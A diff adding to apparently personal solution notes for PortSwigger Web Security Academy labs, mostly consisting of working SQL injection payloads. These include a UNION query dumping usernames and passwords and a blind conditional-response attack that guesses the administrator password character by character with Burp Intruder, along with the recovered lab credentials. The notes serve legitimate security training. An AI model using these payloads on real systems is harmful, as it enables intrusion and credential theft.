@@ -31,3 +31,17 @@ solution:
   step-6: https://aca91fdd1f394b2580ca02b80004002f.web-security-academy.net/filter?category=Corporate+gifts' union select USERNAME_CGUMVU,PASSWORD_MMEGGB from USERS_FNOBMQ--
   step-7: login with credentials (administrator, sn0pc7sw3jlqzgjsnhvz)
 
+[lab: Blind SQL injection with conditional responses]
+url: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+solution:
+  (using resend request)
+  step-1: Cookie: TrackingId=' union select '45' where 1=1--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
+  step-2: Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1) < 'a'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
+  step-3: Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1) < 'A'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
+  step-4: Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1) < '0'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
+  step-5: using burp intruder for substring(password,<N>,1) with N=1...20
+          Cookie: TrackingId=' union select '45' from users where username='administrator' and substring(password,1,1)='§0§'--; session=PDcgX0hdZLCWJsZZey7nUz6UZZSwWjli
+
+  (note: password will change after session expires, and will be unique for each lab-access. It is therefore necessary to use burp intruder to find the password before the session expires)
+  password: haoznk6b9o5m05yvk5me
+
